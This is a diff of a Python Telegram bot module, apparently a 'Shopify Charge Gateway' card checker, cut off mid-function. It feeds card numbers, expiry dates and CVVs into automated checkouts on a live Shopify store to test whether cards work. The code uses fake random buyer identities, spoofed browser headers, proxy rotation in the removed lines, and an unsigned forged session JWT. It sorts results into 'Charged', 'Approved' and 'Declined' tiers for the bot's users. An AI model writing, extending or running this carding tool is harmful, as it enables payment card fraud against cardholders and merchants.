@@ -1,34 +1,37 @@
-# BOT/gates/charge/shopify/shopify.py
-# Shopify Charge Gateway - PROXY SYSTEM ONLY + RESPONSE TRIMMING
+# BOT/gates/charge/shopify/shopify_direct.py
+# Shopify Charge Gateway - HTTP API CHECKOUT
 
 import json
 import asyncio
 import re
 import time
-import httpx
 import random
 import string
-from decimal import Decimal
+import requests
+import urllib.parse
 from datetime import datetime
 from pyrogram import Client, filters
 from pyrogram.types import Message
 import html
 import os
-from urllib.parse import urlparse, parse_qs, urlencode, unquote
-from BOT.helper.permissions import auth_and_free_restricted
-from BOT.helper.start import load_users, save_users
 
-# Import from Admins module for command status
+# Import from helper modules
+try:
+    from BOT.helper.permissions import auth_and_free_restricted
+except ImportError:
+    def auth_and_free_restricted(func):
+        async def wrapper(client, message):
+            return await func(client, message)
+        return wrapper
+
 try:
     from BOT.helper.Admins import is_command_disabled, get_command_offline_message
 except ImportError:
     def is_command_disabled(command_name: str) -> bool:
         return False
-
     def get_command_offline_message(command_name: str) -> str:
         return "Command is temporarily disabled."
 
-# Import universal charge processor
 try:
     from BOT.gc.credit import charge_processor
     CHARGE_PROCESSOR_AVAILABLE = True
@@ -36,141 +39,181 @@ except ImportError:
     charge_processor = None
     CHARGE_PROCESSOR_AVAILABLE = False
 
-# Import proxy system
-try:
-    from BOT.tools.proxy import get_proxy_for_user, mark_proxy_success, mark_proxy_failed
-    PROXY_ENABLED = True
-except ImportError:
-    PROXY_ENABLED = False
-
-# Import bin details function
 try:
     from TOOLS.getbin import get_bin_details
 except ImportError:
     def get_bin_details(bin_number):
         return {}
 
-# Enhanced Custom logger with detailed console logging
-class ConsoleLogger:
+# ========== DETAILED LOGGER ==========
+class ShopifyLogger:
     def __init__(self, user_id=None):
         self.user_id = user_id
         self.check_id = f"SHOP-{random.randint(1000, 9999)}"
         self.start_time = None
         self.step_counter = 0
-        
+        self.logs = []
+
     def start_check(self, card_details):
-        """Start a new check session"""
         self.start_time = time.time()
         self.step_counter = 0
         cc = card_details.split('|')[0] if '|' in card_details else card_details
         masked_cc = cc[:6] + "******" + cc[-4:] if len(cc) > 10 else cc
-        
-        print("\n" + "="*80)
-        print(f"🛒 [SHOPIFY CHARGE PROCESS STARTED]")
-        print(f"   ├── Check ID: {self.check_id}")
-        print(f"   ├── User ID: {self.user_id or 'N/A'}")
-        print(f"   ├── Card: {masked_cc}")
-        print(f"   └── Start Time: {datetime.now().strftime('%H:%M:%S')}")
-        print("="*80 + "\n")
-    
-    def step(self, step_num, step_name, description, status="PROCESSING"):
-        """Log a step in the process"""
+
+        log_msg = f"""
+🛒 [SHOPIFY HTTP CHECKOUT]
+   ├── Check ID: {self.check_id}
+   ├── User ID: {self.user_id or 'N/A'}
+   ├── Card: {masked_cc}
+   ├── Start Time: {datetime.now().strftime('%H:%M:%S')}
+   └── Target: meta-app-prod-store-1.myshopify.com
+        """
+        self.add_log(log_msg)
+        print(log_msg)
+        return log_msg
+
+    def add_log(self, message):
+        timestamp = datetime.now().strftime('%H:%M:%S.%f')[:-3]
+        self.logs.append(f"[{timestamp}] {message}")
+
+    def step(self, step_num, step_name, action, details=None, status="PROCESSING"):
         self.step_counter += 1
         elapsed = time.time() - self.start_time if self.start_time else 0
-        
-        status_emoji = {
-            "PROCESSING": "🔄",
-            "SUCCESS": "✅",
-            "FAILED": "❌",
-            "WARNING": "⚠️",
-            "INFO": "ℹ️"
-        }.get(status, "➡️")
-        
-        print(f"{status_emoji} STEP {step_num:02d}: {step_name}")
-        print(f"   ├── Description: {description}")
-        print(f"   ├── Elapsed: {elapsed:.2f}s")
-        print(f"   └── Timestamp: {datetime.now().strftime('%H:%M:%S.%f')[:-3]}")
-        print()
-        
-        return elapsed
-    
-    def sub_step(self, step_num, sub_step, description, details=None):
-        """Log a sub-step"""
-        elapsed = time.time() - self.start_time if self.start_time else 0
-        print(f"   │   ├── {step_num}.{sub_step}: {description}")
-        if details:
-            print(f"   │   │   └── {details}")
-    
-    def request_details(self, method, url, status_code, response_time, details=None):
-        """Log HTTP request details"""
-        elapsed = time.time() - self.start_time if self.start_time else 0
-        print(f"   │   ├── HTTP {method} {url}")
-        print(f"   │   │   ├── Status: {status_code}")
-        print(f"   │   │   ├── Response Time: {response_time:.2f}s")
-        print(f"   │   │   ├── Total Elapsed: {elapsed:.2f}s")
-        if details:
-            print(f"   │   │   └── Details: {details}")
-    
-    def extracted_data(self, data_type, data_value):
-        """Log extracted data"""
-        print(f"   │   ├── Extracted {data_type}: {data_value}")
-    
-    def error_detail(self, error_message, error_type="ERROR"):
-        """Log error details"""
-        error_emoji = "❌" if error_type == "ERROR" else "⚠️"
-        print(f"{error_emoji} ERROR DETAIL: {error_message}")
-    
-    def result(self, success, message, final_status, response_time):
-        """Log final result"""
-        result_emoji = "✅" if success else "❌"
-        result_text = "SUCCESS" if success else "FAILED"
-        
-        print("\n" + "="*80)
-        print(f"{result_emoji} [SHOPIFY CHARGE PROCESS COMPLETED]")
-        print(f"   ├── Check ID: {self.check_id}")
-        print(f"   ├── Result: {result_text}")
-        print(f"   ├── Final Status: {final_status}")
-        print(f"   ├── Response: {message[:100]}{'...' if len(message) > 100 else ''}")
-        print(f"   ├── Total Steps: {self.step_counter}")
-        print(f"   ├── Total Time: {response_time:.2f}s")
-        print(f"   └── End Time: {datetime.now().strftime('%H:%M:%S')}")
-        print("="*80 + "\n")
 
-# Create global logger instance
-logger = ConsoleLogger()
+        status_icons = {
+            "PROCESSING": "🔄", "SUCCESS": "✅", "FAILED": "❌",
+            "WARNING": "⚠️", "INFO": "ℹ️", "CAPTCHA": "🛡️",
+            "DECLINED": "⛔", "HUMAN": "👤", "CLICK": "🖱️",
+            "TYPE": "⌨️", "WAIT": "⏳"
+        }
+        status_icon = status_icons.get(status, "➡️")
+
+        log_msg = f"{status_icon} STEP {step_num:02d}: {step_name}"
+        log_msg += f"\n   ├── Action: {action}"
+        log_msg += f"\n   ├── Elapsed: {elapsed:.2f}s"
+        log_msg += f"\n   ├── Time: {datetime.now().strftime('%H:%M:%S')}"
+        if details:
+            log_msg += f"\n   └── Details: {details}"
+
+        self.add_log(log_msg)
+        print(log_msg)
+        print()
+        return log_msg
+
+    def data_extracted(self, data_type, value, source=""):
+        if isinstance(value, dict):
+            value_str = json.dumps(value, indent=2)
+            if len(value_str) > 150:
+                value_str = value_str[:147] + "..."
+        else:
+            value_str = str(value)
+            if len(value_str) > 100:
+                value_str = value_str[:97] + "..."
+
+        log_msg = f"   ├── 📊 Extracted {data_type}: {value_str}"
+        if source:
+            log_msg += f"\n   │   └── From: {source}"
+        self.add_log(log_msg)
+        print(log_msg)
+        return log_msg
+
+    def card_details_log(self, cc, mes, ano, cvv):
+        masked_cc = cc[:6] + "******" + cc[-4:]
+        log_msg = f"""
+   ├── 💳 Card Details:
+   │   ├── Number: {masked_cc}
+   │   ├── Expiry: {mes}/{ano}
+   │   └── CVV: {'*' * len(cvv)}
+        """
+        self.add_log(log_msg)
+        print(log_msg)
+        return log_msg
+
+    def error_log(self, error_type, message, step=""):
+        error_icons = {
+            "CAPTCHA": "🛡️", "DECLINED": "💳", "FRAUD": "🚫",
+            "TIMEOUT": "⏰", "CONNECTION": "🔌", "UNKNOWN": "❓"
+        }
+        error_icon = error_icons.get(error_type, "⚠️")
+        log_msg = f"{error_icon} ERROR [{error_type}]: {message}"
+        if step:
+            log_msg += f"\n   └── At Step: {step}"
+        self.add_log(log_msg)
+        print(log_msg)
+        print()
+        return log_msg
+
+    def success_log(self, message, details=""):
+        log_msg = f"✅ SUCCESS: {message}"
+        if details:
+            log_msg += f"\n   └── Details: {details}"
+        self.add_log(log_msg)
+        print(log_msg)
+        return log_msg
+
+    def complete_result(self, success, final_status, response_message, total_time):
+        result_icon = "✅" if success else "❌"
+        result_text = "APPROVED" if success else "DECLINED"
+
+        if len(response_message) > 100:
+            response_display = response_message[:97] + "..."
+        else:
+            response_display = response_message
+
+        log_msg = f"""
+{result_icon} [SHOPIFY CHECKOUT COMPLETED]
+   ├── Check ID: {self.check_id}
+   ├── Result: {result_text}
+   ├── Final Status: {final_status}
+   ├── Steps Completed: {self.step_counter}
+   ├── Total Time: {total_time:.2f}s
+   ├── Response: {response_display}
+   └── End Time: {datetime.now().strftime('%H:%M:%S')}
+        """
+        summary = f"📊 SUMMARY: {result_icon} {final_status} | {total_time:.2f}s | Steps: {self.step_counter}"
+        self.add_log(log_msg)
+        self.add_log(summary)
+        print(log_msg)
+        print(summary)
+        print("="*80)
+        return log_msg, summary
+
+    def get_all_logs(self):
+        return "\n".join(self.logs)
+
+
+# ========== UTILITY FUNCTIONS ==========
+def load_users():
+    try:
+        with open("DATA/users.json", "r") as f:
+            return json.load(f)
+    except:
+        return {}
 
 def load_owner_id():
     try:
         with open("FILES/config.json", "r") as f:
-            config_data = json.load(f)
-            return config_data.get("OWNER")
+            return json.load(f).get("OWNER")
     except:
         return None
 
 def get_user_plan(user_id):
     users = load_users()
-    user_id_str = str(user_id)
-    if user_id_str in users:
-        return users[user_id_str].get("plan", {})
+    if str(user_id) in users:
+        return users[str(user_id)].get("plan", {})
     return {}
 
 def is_user_banned(user_id):
     try:
         if not os.path.exists("DATA/banned_users.txt"):
             return False
-
         with open("DATA/banned_users.txt", "r") as f:
-            banned_users = f.read().splitlines()
-
-        return str(user_id) in banned_users
+            return str(user_id) in f.read().splitlines()
     except:
         return False
 
 def check_cooldown(user_id, command_type="sh"):
-    """Check cooldown for user - SKIP FOR OWNER"""
     owner_id = load_owner_id()
-    
-    # Skip cooldown check for owner
     if str(user_id) == str(owner_id):
         return True, 0
 
@@ -186,10 +229,7 @@ def check_cooldown(user_id, command_type="sh"):
     if user_key in cooldowns:
         last_time = cooldowns[user_key]
         user_plan = get_user_plan(user_id)
-        antispam = user_plan.get("antispam", 15)
-
-        if antispam is None:
-            antispam = 15
+        antispam = user_plan.get("antispam", 15) or 15
 
         if current_time - last_time < antispam:
             return False, antispam - (current_time - last_time)
@@ -203,95 +243,88 @@ def check_cooldown(user_id, command_type="sh"):
 
     return True, 0
 
-def trim_response(raw_response):
-    """Trim response to only show the error code without prefixes"""
-    if not raw_response:
-        return "-"
-    
-    raw_response = str(raw_response).strip()
-    raw_response_upper = raw_response.upper()
-    
-    # List of error codes to extract
-    error_codes = [
-        "CAPTCHA_REQUIRED",
-        "INSUFFICIENT_FUNDS",
-        "INVALID_CVC",
-        "INCORRECT_CVC",
-        "EXPIRED_CARD",
-        "CARD_DECLINED",
-        "DECLINED",
-        "INVALID_CARD",
-        "DO_NOT_HONOR",
-        "FRAUD",
-        "RATE_LIMITED",
-        "TIMEOUT",
-        "CONNECTION_ERROR",
-        "PROXY_DEAD"
-    ]
-    
-    # Check if any error code is in the response
-    for code in error_codes:
-        if code in raw_response_upper:
-            return code
-    
-    # If no specific code found, return original response
-    return raw_response
 
+# ========== FORMAT RESPONSE FUNCTION ==========
 def format_shopify_response(cc, mes, ano, cvv, raw_response, timet, profile, user_data):
-    """Format response with trimmed error codes"""
     fullcc = f"{cc}|{mes}|{ano}|{cvv}"
 
-    # Extract user_id from profile
     try:
         user_id = str(user_data.get("user_id", "Unknown"))
-    except Exception:
+    except:
         user_id = None
 
-    # Load gateway from DATA/sites.json
     try:
         with open("DATA/sites.json", "r") as f:
             sites = json.load(f)
         gateway = sites.get(user_id, {}).get("gate", "Shopify Self Site 💷")
-    except Exception:
+    except:
         gateway = "Shopify Self Site 💷"
 
-    # Clean and trim response
-    raw_response = trim_response(raw_response)
-
-    # Determine status - IMPROVED LOGIC
+    raw_response = str(raw_response) if raw_response else "-"
     raw_response_upper = raw_response.upper()
-    
-    # Check for successful charges
+
+    # Check for SUCCESS indicators
     if any(keyword in raw_response_upper for keyword in [
-        "ORDER_PLACED", "SUBMITSUCCESS", "SUCCESSFUL", "APPROVED", "RECEIPT"
+        "ORDER_PLACED", "SUBMITSUCCESS", "SUCCESSFUL", "APPROVED", "RECEIPT",
+        "COMPLETED", "PAYMENT_SUCCESS", "CHARGE_SUCCESS", "THANK_YOU",
+        "ORDER_CONFIRMATION", "YOUR_ORDER_IS_CONFIRMED", "ORDER_CONFIRMED",
+        "SHOPIFY_PAYMENTS", "SHOP_PAY", "CHARGED", "LIVE", "ORDER_CONFIRMED",
+        "ORDER #", "PROCESSEDRECEIPT", "THANK YOU", "PAYMENT_SUCCESSFUL",
+        "PROCESSINGRECEIPT", "AUTHORIZED", "YOUR ORDER IS CONFIRMED"
     ]):
         status_flag = "Charged 💎"
-    # Check for OTP/3D Secure
-    elif any(keyword in raw_response_upper for keyword in [
-        "3D", "AUTHENTICATION", "OTP", "VERIFICATION", "CVV-MATCH-OTP", 
-        "3DS", "PENDING", "SECURE REQUIRED"
-    ]):
-        status_flag = "Approved ❎"
-    # Check for address/ZIP issues (these are often approved but need verification)
-    elif any(keyword in raw_response_upper for keyword in [
-        "ADDRESS", "ZIP", "AVS", "VERIFICATION FAILED", "MISMATCHED"
-    ]):
-        status_flag = "Approved ❎"
     # Check for CAPTCHA
-    elif "CAPTCHA" in raw_response_upper:
-        status_flag = "Captcha ⚠️"
-    # Check for rate limiting
     elif any(keyword in raw_response_upper for keyword in [
-        "RATE LIMITED", "THROTTLED", "LIMIT EXCEEDED"
+        "CAPTCHA", "SOLVE THE CAPTCHA", "CAPTCHA_METADATA_MISSING", 
+        "CAPTCHA DETECTED", "CAPTCHA_REQUIRED", "CAPTCHA_VALIDATION_FAILED", 
+        "CAPTCHA_ERROR", "BOT_DETECTED", "HUMAN_VERIFICATION", "SECURITY_CHECK",
+        "HCAPTCHA", "CLOUDFLARE", "ENTER PAYMENT INFORMATION AND SOLVE",
+        "RECAPTCHA", "I'M NOT A ROBOT", "PLEASE VERIFY"
     ]):
-        status_flag = "Rate Limit ⏰"
-    # Check for specific decline reasons
+        status_flag = "Captcha ⚠️"
+    # Check for PAYMENT ERROR
     elif any(keyword in raw_response_upper for keyword in [
-        "INSUFFICIENT FUNDS", "INVALID CVC", "INCORRECT CVC", 
-        "YOUR CARD DOES NOT SUPPORT", "CARD DECLINED", "DECLINED", 
-        "FAILED", "EXPIRED", "INVALID CARD", "DO NOT HONOR"
+        "THERE WAS AN ISSUE PROCESSING YOUR PAYMENT", "PAYMENT ISSUE",
+        "ISSUE PROCESSING", "PAYMENT ERROR", "PAYMENT PROBLEM",
+        "TRY AGAIN OR USE A DIFFERENT PAYMENT METHOD", "CARD WAS DECLINED",
+        "YOUR PAYMENT COULDN'T BE PROCESSED", "PAYMENT FAILED"
     ]):
         status_flag = "Declined ❌"
+    # Check for INSUFFICIENT FUNDS
+    elif any(keyword in raw_response_upper for keyword in [
+        "INSUFFICIENT FUNDS", "INSUFFICIENT_FUNDS", "FUNDS", "NOT ENOUGH MONEY"
+    ]):
+        status_flag = "Declined ❌"
+    # Check for INVALID CARD
+    elif any(keyword in raw_response_upper for keyword in [
+        "INVALID CARD", "CARD IS INVALID", "CARD_INVALID", "CARD NUMBER IS INVALID"
+    ]):
+        status_flag = "Declined ❌"
+    # Check for EXPIRED CARD
+    elif any(keyword in raw_response_upper for keyword in [
+        "EXPIRED", "CARD HAS EXPIRED", "CARD_EXPIRED", "EXPIRATION DATE"
+    ]):
+        status_flag = "Declined ❌"
+    # Check for 3D Secure
+    elif any(keyword in raw_response_upper for keyword in [
+        "3D", "AUTHENTICATION", "OTP", "VERIFICATION", "CVV-MATCH-OTP", 
+        "3DS", "PENDING", "SECURE REQUIRED", "SECURE_CODE", "AUTH_REQUIRED",
+        "3DS REQUIRED", "AUTHENTICATION_FAILED", "COMPLETEPAYMENTCHALLENGE",
+        "ACTIONREQUIREDRECEIPT", "ADDITIONAL_VERIFICATION_NEEDED",
+        "VERIFICATION_REQUIRED", "CARD_VERIFICATION", "AUTHENTICATE"
+    ]):
+        status_flag = "Approved ❎"
+    # Check for CVV errors
+    elif any(keyword in raw_response_upper for keyword in [
+        "INVALID CVC", "INCORRECT CVC", "CVC_INVALID", "CVV", "SECURITY CODE"
+    ]):
+        status_flag = "Declined ❌"
+    # Check for fraud
+    elif any(keyword in raw_response_upper for keyword in [
+        "FRAUD", "FRAUD_SUSPECTED", "SUSPECTED_FRAUD", "FRAUDULENT",
+        "RISKY", "HIGH_RISK", "SECURITY_VIOLATION", "SUSPICIOUS"
+    ]):
+        status_flag = "Fraud ⚠️"
     # Default to declined
     else:
         status_flag = "Declined ❌"
@@ -308,21 +341,18 @@ def format_shopify_response(cc, mes, ano, cvv, raw_response, timet, profile, use
         "bank": bin_data.get("bank", "Unknown")
     }
 
-    # User Plan
     try:
         plan = user_data.get("plan", {}).get("plan", "Free")
         badge = user_data.get("plan", {}).get("badge", "🎭")
         first_name = user_data.get("first_name", "User")
-    except Exception:
+    except:
         plan = "Free"
         badge = "🎭"
         first_name = "User"
 
-    # Clean name
     clean_name = re.sub(r'[↑←«~∞🏴]', '', first_name).strip()
     profile_display = f"『{badge}』{clean_name}"
 
-    # Final formatted message - SHOW 0.55$ IN UI
     result = f"""
 <b>[#Shopify Charge] | WAYNE</b> ✦
 ━━━━━━━━━━━━━━━
@@ -339,1427 +369,1059 @@ def format_shopify_response(cc, mes, ano, cvv, raw_response, timet, profile, use
 <b>[ﾒ] Checked By</b>: {profile_display} [<code>{plan} {badge}</code>]
 <b>[ϟ] Dev</b> ➺</b> <b><i>DADYY</i></b>
 ━━━━━━━━━━━━━━━
-<b>[ﾒ] T/t</b>: <code>[{timet:.2f} 𝐬]</code> <b>|P/x:</b> [<code>Live ⚡️</code>]]
+<b>[ﾒ] T/t</b>: <code>[{timet:.2f} 𝐬]</code> <b>|P/x:</b> [<code>Live ⚡️</code>]
 """
     return result
 
-class ShopifyChargeChecker:
+
+# ========== HTTP CHECKOUT CLASS ==========
+class ShopifyHTTPCheckout:
     def __init__(self, user_id=None):
-        # Modern browser user agents
-        self.user_agents = [
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0",
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0",
-            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
-        ]
-        self.user_agent = random.choice(self.user_agents)
-        self.base_url = "https://meta-app-prod-store-1.myshopify.com"
-        self.product_url = f"{self.base_url}/products/retailer-id-fix-no-mapping"
         self.user_id = user_id
-        self.current_proxy = None
-        
-        # Dynamic data that needs to be fetched per session
-        self.cookies = {}
+        self.base_url = "https://meta-app-prod-store-1.myshopify.com"
+        self.product_handle = "retailer-id-fix-no-mapping"
+        self.product_url = f"{self.base_url}/products/{self.product_handle}"
+
+        # Session for maintaining cookies
+        self.session = requests.Session()
+
+        # Headers template based on captured requests
+        self.headers = {
+            'authority': 'meta-app-prod-store-1.myshopify.com',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+            'cache-control': 'max-age=0',
+            'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'none',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36'
+        }
+
+        # Dynamic data storage
         self.checkout_token = None
-        self.x_checkout_one_session_token = None
-        self.x_checkout_web_build_id = None
-        self.variant_id = None
-        self.product_id = None
-        self.product_price = None  # Store actual product price
-        self.shop_id = None
-        self.delivery_strategy_handle = "5315e952d539372894df63d2b7463df0-be73b24eea304774d3c2df281c6988e5"
-        
-        # CORRECTED addresses from your instructions - FOR PICKUP
-        self.shipping_address = {
-            "first_name": "Paris",
-            "last_name": "Hilton",
-            "address1": "8 Log Pond Drive",
-            "address2": "",
-            "city": "Horsham",
-            "province": "PA",
-            "zip": "19044",
-            "country": "US",
-            "phone": "5551234567",
-            "email": "brucewayne0002@gmail.com"
-        }
-        
-        # Random billing name as per instructions - for cardholder name
-        self.random_first_name = self.generate_random_name()
-        self.random_last_name = self.generate_random_name()
-        
-        # Billing address - same as pickup address but with random name
-        self.billing_address = {
-            "first_name": self.random_first_name,
-            "last_name": self.random_last_name,
-            "address1": "8 Log Pond Drive",
-            "address2": "",
-            "city": "Horsham",
-            "province": "PA",
-            "zip": "19044",
-            "country": "US",
-            "phone": "5551234567"
-        }
-        
-        # Initialize with proxy if available
-        if PROXY_ENABLED and user_id:
-            self.current_proxy = get_proxy_for_user(user_id, "random")
-            if self.current_proxy:
-                print(f"🔄 PROXY: Using proxy: {self.current_proxy[:50]}...")
-        
-        # Initialize console logger
-        self.console_logger = ConsoleLogger(user_id)
-    
-    def generate_random_name(self):
-        """Generate random first and last name"""
-        first_names = ["John", "Michael", "David", "James", "Robert", "William", "Richard", "Joseph", "Thomas", "Charles"]
-        last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
-        return random.choice(first_names)
-    
-    def get_base_headers(self):
-        """Get base headers for browser-like requests"""
-        return {
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'Accept-Encoding': 'gzip, deflate, br, zstd',
-            'Accept-Language': 'en-US,en;q=0.9',
-            'Cache-Control': 'no-cache',
-            'Connection': 'keep-alive',
-            'DNT': '1',
-            'Pragma': 'no-cache',
-            'Sec-CH-UA': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
-            'Sec-CH-UA-Mobile': '?0',
-            'Sec-CH-UA-Platform': '"Windows"',
-            'Sec-Fetch-Dest': 'document',
-            'Sec-Fetch-Mode': 'navigate',
-            'Sec-Fetch-Site': 'none',
-            'Sec-Fetch-User': '?1',
-            'Upgrade-Insecure-Requests': '1',
-            'User-Agent': self.user_agent
-        }
-        
-    async def make_request(self, client, method, url, **kwargs):
-        """Make request with proxy support and error handling - RETURNS PROXY DEAD ERROR"""
-        try:
-            # Add headers if not present
-            if 'headers' not in kwargs:
-                kwargs['headers'] = self.get_base_headers()
-            
-            # Add timeout if not present
-            if 'timeout' not in kwargs:
-                kwargs['timeout'] = 30.0
-            
-            # Add cookies if we have them
-            if self.cookies and 'cookies' not in kwargs:
-                kwargs['cookies'] = self.cookies
-            
-            # Make request
-            start_time = time.time()
-            response = await client.request(method, url, **kwargs)
-            response_time = time.time() - start_time
-            
-            # Update proxy stats if proxy was used
-            if self.current_proxy and PROXY_ENABLED:
-                if response.status_code < 400:
-                    mark_proxy_success(self.current_proxy, response_time)
-                else:
-                    mark_proxy_failed(self.current_proxy)
-            
-            # Update cookies from response
-            if 'set-cookie' in response.headers:
-                cookies_to_update = response.headers.get_list('set-cookie')
-                for cookie in cookies_to_update:
-                    # Parse cookie
-                    if '=' in cookie:
-                        name_value = cookie.split(';')[0]
-                        if '=' in name_value:
-                            name, value = name_value.split('=', 1)
-                            self.cookies[name] = value
-            
-            return response
-            
-        except Exception as e:
-            # Update proxy stats on failure
-            if self.current_proxy and PROXY_ENABLED:
-                mark_proxy_failed(self.current_proxy)
-            print(f"❌ Request error for {url}: {str(e)}")
-            # Return None to indicate proxy/request failure
+        self.session_token = None  # x-checkout-one-session-token for headers
+        self.graphql_session_token = None  # checkout_token-timestamp for GraphQL variables
+        self.receipt_id = None
+        self.cart_token = None
+        self.variant_id = "43207284392098"  # From captured request
+        self.product_id = "7890988171426"   # From captured request
+
+        # Store extracted schema info
+        self.proposal_id = None
+        self.submit_id = None
+        self.delivery_strategy_handle = None
+
+        self.logger = ShopifyLogger(user_id)
+
+        # Random data generators
+        self.first_names = ["James", "Robert", "John", "Michael", "David", "William", "Richard", 
+                           "Joseph", "Thomas", "Charles", "Daniel", "Matthew", "Anthony", "Mark", 
+                           "Donald", "Steven", "Paul", "Andrew", "Kenneth", "Joshua", "Kevin", 
+                           "Brian", "George", "Timothy", "Ronald", "Edward", "Jason", "Jeffrey",
+                           "Casey", "Mini", "Bruce", "Tony", "Steve", "Peter", "Clark", "Randua"]
+        self.last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", 
+                          "Davis", "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez", 
+                          "Wilson", "Anderson", "Thomas", "Taylor", "Moore", "Jackson", "Martin", 
+                          "Lee", "Perez", "Thompson", "White", "Harris", "Sanchez", "Clark", "Lang", "Trump"]
+
+        self.first_name = random.choice(self.first_names)
+        self.last_name = random.choice(self.last_names)
+        self.full_name = f"{self.first_name} {self.last_name}"
+        self.email = f"{self.first_name.lower()}{self.last_name.lower()}{random.randint(10,99)}@gmail.com"
+        self.phone = f"215{random.randint(100, 999)}{random.randint(1000, 9999)}"
+
+    def random_delay(self, min_sec=0.5, max_sec=2.0):
+        """Random delay between requests"""
+        time.sleep(random.uniform(min_sec, max_sec))
+
+    def step(self, num, name, action, details=None, status="PROCESSING"):
+        return self.logger.step(num, name, action, details, status)
+
+    def extract_checkout_token(self, url):
+        """Extract checkout token from URL"""
+        patterns = [
+            r'/checkouts/cn/([^/?]+)',
+            r'/checkout/[^/]+/cn/([^/?]+)',
+            r'token=([^&]+)'
+        ]
+        for pattern in patterns:
+            match = re.search(pattern, url)
+            if match:
+                return match.group(1)
+        return None
+
+    def generate_random_string(self, length=16):
+        """Generate random string for cookies"""
+        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
+
+    def generate_uuid(self):
+        """Generate UUID format string"""
+        return f"{self.generate_random_string(8)}-{self.generate_random_string(4)}-4{self.generate_random_string(3)}-{random.choice(['8','9','a','b'])}{self.generate_random_string(3)}-{self.generate_random_string(12)}"
+
+    def generate_tracking_ids(self):
+        """Generate tracking IDs like _shopify_y and _shopify_s"""
+        return self.generate_uuid(), self.generate_uuid()
+
+    def generate_timestamp(self):
+        """Generate timestamp for session token (milliseconds since epoch)"""
+        return str(int(time.time() * 1000))
+
+    def construct_graphql_session_token(self):
+        """Construct session token for GraphQL variables: checkout_token-timestamp"""
+        if not self.checkout_token:
             return None
-            
-    async def human_delay(self, min_delay=1, max_delay=3):
-        """Simulate human delay between actions"""
-        delay = random.uniform(min_delay, max_delay)
-        await asyncio.sleep(delay)
-        
-    async def load_homepage(self, client):
-        """Load homepage to get initial cookies and shop info"""
+        timestamp = self.generate_timestamp()
+        return f"{self.checkout_token}-{timestamp}"
+
+    def generate_session_token_from_checkout(self):
+        """Generate a session token based on checkout token when not found in response"""
+        if not self.checkout_token:
+            return None
+
+        import base64
+        header = json.dumps({"alg": "none", "typ": "JWT"})
+        payload = json.dumps({
+            "checkout_token": self.checkout_token,
+            "exp": int(time.time()) + 3600,
+            "iat": int(time.time())
+        })
+
+        header_b64 = base64.urlsafe_b64encode(header.encode()).decode().rstrip('=')
+        payload_b64 = base64.urlsafe_b64encode(payload.encode()).decode().rstrip('=')
+        signature = self.generate_random_string(43)
+
+        return f"{header_b64}.{payload_b64}.{signature}"
+
+    def extract_session_token_from_html_aggressive(self, html_content):
+        """Aggressively extract session token from HTML using all possible patterns"""
+        session_token = None
+
+        patterns = [
+            (r'x-checkout-one-session-token["\']?\s*[:=]\s*["\']([A-Za-z0-9_-]{100,})["\']', "Script assignment"),
+            (r'"x-checkout-one-session-token"[:\s]+"([A-Za-z0-9_-]{100,})"', "JSON property"),
+            (r'sessionToken["\']?\s*[:=]\s*["\']([A-Za-z0-9_-]{100,}\.[A-Za-z0-9_-]{100,})["\']', "Session token JWT"),
+            (r'"sessionToken"[:\s]+"([A-Za-z0-9_-]{100,}\.[A-Za-z0-9_-]{100,})"', "SessionToken JSON"),
+            (r'window\.__INITIAL_STATE__.*?"sessionToken"[:\s]+"([^"]{100,})"', "Initial state"),
+            (r'window\.__DATA__.*?"sessionToken"[:\s]+"([^"]{100,})"', "Window data"),
+            (r'"checkout-one".*?"token"[:\s]+"([^"]{100,})"', "Checkout one token"),
+        ]
+
+        for pattern, source in patterns:
+            match = re.search(pattern, html_content, re.IGNORECASE | re.DOTALL)
+            if match:
+                candidate = match.group(1)
+                if len(candidate) > 100 and '.' in candidate:
+                    session_token = candidate
+                    self.logger.data_extracted("Session Token (Aggressive)", session_token[:50] + "...", source)
+                    return session_token
+
+        jwt_patterns = [
+            r'[A-Za-z0-9_-]{100,200}\.[A-Za-z0-9_-]{100,200}\.[A-Za-z0-9_-]{40,100}',
+            r'["\']([A-Za-z0-9_-]{150,300}\.[A-Za-z0-9_-]{50,150})["\']',
+        ]
+
+        for pattern in jwt_patterns:
+            matches = re.findall(pattern, html_content)
+            for match in matches:
+                if len(match) > 150 and '.' in match and 'checkout' in html_content.lower():
+                    session_token = match
+                    self.logger.data_extracted("Session Token (JWT Search)", session_token[:50] + "...", "Regex pattern")
+                    return session_token
+
+        return None
+
+    def extract_bootstrap_data(self, html_content):
+        """Extract bootstrap data from checkout page HTML"""
         try:
